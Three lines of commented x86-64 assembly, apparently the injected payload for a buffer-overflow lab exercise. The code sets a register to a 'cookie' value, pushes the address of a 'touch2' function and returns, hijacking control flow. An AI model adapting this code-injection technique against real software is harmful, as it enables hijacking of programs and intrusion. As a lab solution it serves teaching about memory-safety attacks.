movq     $0x59b997fa, %rdi    # set rdi = cookie
pushq    $0x4017ec            # push the touch2 address to stack
ret                           # transfer control to the first instruction in touch2
